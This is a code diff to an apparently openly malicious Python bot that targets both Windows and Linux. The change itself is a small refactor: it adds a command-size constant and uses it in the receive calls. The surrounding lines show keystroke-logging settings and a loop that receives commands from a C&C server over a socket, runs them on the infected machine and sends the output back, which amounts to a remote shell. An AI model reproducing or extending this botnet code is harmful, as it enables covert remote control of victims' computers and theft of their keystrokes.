@@ -30,6 +30,7 @@ KEY = "Where's the money?" # Encryption key... :)
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
 BLOCK_CIPHER_STRING = "You have been pawned!" # The string to use in cipher block encryption.
 LOG = '' # Will store the keystrokes of the user.
+COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -190,7 +191,7 @@ class WindowsBot:
 		"""
 		sock = create_client_socket() # Store socket object.
 		with sock:
-			command = sock.recv(1024).decode('utf-8') # Receive command from server.
+			command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 			while command != '':
 				command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
 				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
@@ -229,7 +230,7 @@ class LinuxBot:
 		"""
 		sock = create_client_socket() # Store socket object.
 		with sock:
-			command = sock.recv(1024).decode('utf-8') # Receive command from server.
+			command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 			while command != '':
 				command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
